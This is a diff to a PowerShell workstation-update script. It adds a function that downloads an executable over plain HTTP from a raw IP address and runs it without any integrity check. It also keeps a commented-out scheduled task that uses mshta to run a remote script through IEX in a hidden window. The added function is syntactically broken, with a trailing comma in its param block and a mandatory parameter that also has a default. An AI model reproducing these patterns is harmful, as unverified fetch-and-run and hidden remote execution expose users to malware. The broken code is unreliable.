@@ -304,6 +304,37 @@ function Update-Hicos {
     }
 }
 
+# Install-VANS
+function Install-Vans {
+    param(
+        [Parameter(Mandatory=$true)]
+        [string]$DownloadUrl = "http://128.5.47.252/2025_12_18_14_40_27.exe",
+    )
+    try {
+        Write-Log -Message "[VANS] Installing..."
+
+        $Installer = Join-Path $env:TEMP "vans.exe"
+        # Download installer
+        Write-Log -Message "[VANS] Downloading package from $DownloadUrl"
+        Invoke-WebRequest -Uri $DownloadUrl -OutFile $Installer -ErrorAction Stop
+
+        # Run installer
+        $proc = Start-Process -FilePath $Installer -Wait -PassThru
+        if ($proc.ExitCode -eq 0) {
+            Write-Log -Message "[VANS] Installation successful."
+        } else {
+            Write-Log -Message "[VANS] Installation failed with ExitCode: $($proc.ExitCode)"
+        }
+
+        # Cleanup temporary files
+        Write-Log -Message "[VANS] Cleaning up temporary files..."
+        if (Test-Path $Installer) { Remove-Item $Installer -Force }
+    } catch {
+        Write-Log -Message "[VANS] Error, something wrong?"
+        # Optionally: Trigger a fresh install logic here if the service is missing
+    }
+}
+
 # -------------------- hide user update popup window --------------------
 # $newAction = New-ScheduledTaskAction -Execute "mshta" -Argument "vbscript:Execute(""CreateObject(""""WScript.Shell"""").Run """"powershell -Command IEX (Invoke-RestMethod -Uri 'https://raw.githubusercontent.com/ShirakamiFubuking/Scripts/refs/heads/main/user.ps1')"""",0,True:close()"")"
 # Set-ScheduledTask -TaskName "pwb_update_user" -Action $newAction
@@ -416,3 +447,10 @@ Update-Hicos $Config.Hicos.TargetVersion
 # ==================== 7-Zip Update ====================
 Write-Log -Message "[7-Zip] Checking installation..."
 Update-7zip $Config.SevenZip.TargetVersion
+
+# ==================== VANS Update ====================
+if (Get-Command "pcinfo7" -ErrorAction SilentlyContinue) {
+    Install-Vans
+}else{
+    Write-Log "[VANS] no install"
+}
